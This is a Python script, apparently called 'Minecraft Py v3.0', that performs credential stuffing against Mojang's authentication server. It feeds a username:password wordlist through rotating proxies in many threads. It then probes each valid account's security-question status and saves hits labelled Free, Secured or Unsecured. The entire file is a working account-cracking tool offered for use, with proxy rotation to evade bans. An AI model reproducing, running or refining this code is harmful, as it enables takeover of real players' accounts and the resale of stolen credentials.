#Library imports
import requests
from requests import Timeout
from multiprocessing import JoinableQueue as Queue
import threading
import os
from threading import Thread
import random
import ctypes
import time
import socks

#File imports
from static.menu import threads, timeout, proxy_type, logs, main_menu, colors
from static.proxies import requests_proxy, load_proxy
from static.wordlists import load_wordlist, vail_wordlists
from static.results import results, times


#Status
class status:
    Hits = 0
    Free = 0
    Secured = 0
    Unsecured = 0
    errors = 0
    wordlist = 0
    loaded_wordlist = 0

#Checks per second
class cpm:
    def __init__(self,start_timestamp):
        self.start_timestamp = start_timestamp
    
    def cpm(self):
        cpm = 0.0
        seconds = int(time.time()) - self.start_timestamp
        try:
            cpm = status.wordlist / seconds * 60
        except:
            pass
        return cpm
global cpm_counter
cpm_counter = cpm(int(time.time()))


#Title bar
def updateTitle():
    meow = int(cpm_counter.cpm())
    ctypes.windll.kernel32.SetConsoleTitleW(f"Minecraft Py v3.0 | Status: {status.wordlist}/{status.loaded_wordlist} Errors/Banned: {status.errors} CPM: {meow} | Hits: {status.Hits} Unsecured: {status.Unsecured} Secured: {status.Secured} Free: {status.Free}")
    pass


#Login Requests
def login(q,proxies,log,proxy_type):
    while True:
        goodAttempt = False
        item = q.get()

        if (item==None):
            return False
        
        while not (goodAttempt):
            username = item[0]
            password = item[1]
            def login_function(username,password,proxy,proxy_type):
                sess = requests.session()

                url = "https://authserver.mojang.com/authenticate"
                data ={"agent":{"name":"Minecraft", "version":1}, "username":username, "password":password, "requestUser":"true"}
                headers = {"Content-Type":"application/json"}
                failkeys = ["MethodNotAllowed","NotFound","ForbiddenOperationException","IllegalArgumentException", "IllegalArgumentException", "Unsupported MediaType"]
                
                if proxy != None:
                    proxy = requests_proxy(proxy, proxy_type)

                rsp = ""

                try:
                    rsp = sess.post(url, json=data, headers=headers,proxies=proxy, timeout=timeout)
                #Errors status
                except requests.ConnectionError:
                    status.errors += 1
                    return False
                except requests.Timeout:
                    status.errors += 1
                    return False
                except:
                    status.errors += 1
                    return False

                try:
                    data = rsp.json()
                except:
                    return False

                if any(x in rsp.text for x in failkeys):
                    if log == 1:
                        print(colors.red + f" [Fail]: {username}:{password}")
                    return True

                elif 'selectedProfile' not in rsp.text:
                    print(colors.yellow + f" [Free]: {username}:{password}")
                    results.Free(f"{username}:{password} | Free ")
                    status.Free += 1
                    if status.Free == 1 and times.timestamp == None:
                        times.timestamp                    
                    updateTitle()                    
                    return True
                else:
                    pass

                token = data['accessToken']
                mcusername = data['selectedProfile']['name']

                url2 = "https://api.mojang.com/user/security/challenges"
                headers2 = {"Authorization":f"Bearer {token}"}

                try:
                    rsp2 = sess.get(url2, headers=headers2)
                except requests.ConnectionError:
                    status.errors += 1
                    return False
                except requests.Timeout:
                    status.errors += 1
                    return False
                except:
                    status.errors += 1
                    return False


                if 'answer' in rsp2.text:
                    print(colors.green + f" [Secured]: {username}:{password} | Username: {mcusername}")
                    results.Secured(f"{username}:{password} | Username: {mcusername} | Secured")
                    status.Secured += 1
                    if status.Secured == 1 and times.timestamp == None:
                        times.timestamp                    

                    results.Hits(f"{username}:{password} | Username: {mcusername} | Secured")
                    status.Hits += 1
                    updateTitle()
                    return True

                elif 'answer' not in rsp2.text:
                    security = 'Unsecured'
                    print(colors.cyan + f" [Unsecured]: {username}:{password} | Username: {mcusername}")
                    results.Unsecured(f"{username}:{password} | Username: {mcusername} | Unsecured")
                    status.Unsecured += 1
                    if status.Unsecured == 1 and times.timestamp == None:
                        times.timestamp                    

                    results.Hits(f"{username}:{password} | Username: {mcusername} | Unsecured")
                    status.Hits += 1
                    updateTitle()
                    return True
                else:
                    pass


            #Errors
            proxy = None
            if proxies:
                proxy = random.choice(proxies)
            goodAttempt = login_function(username,password,proxy,proxy_type)
            if goodAttempt == False:
                if log == 1:
                    print(colors.normal + f" [Error]: {username}:{password}")

        else:
            status.wordlist +=1
            updateTitle()
            q.task_done()


if __name__ == "__main__":
    main_menu()
    threads_input = threads()
    timeout = timeout()
    proxy_type = proxy_type()
    log = logs()
    worldist_array = load_wordlist()
    status.loaded_wordlist = len(worldist_array)
    q = vail_wordlists(worldist_array)
    proxies = load_proxy()


    #Threads
    for i in range(threads_input):
        worker = Thread(target=login, args=(q,proxies,log,proxy_type))
        worker.setDaemon(True)
        worker.start()


    #To join the queue thread until it's empty
    q.join()

    #Final results
    print(colors.normal,f"""
  Checking Done.

  Hits: {status.Hits}
  Secured: {status.Secured}
  Unsecured: {status.Unsecured}
  Free: {status.Free}
""")


input("")
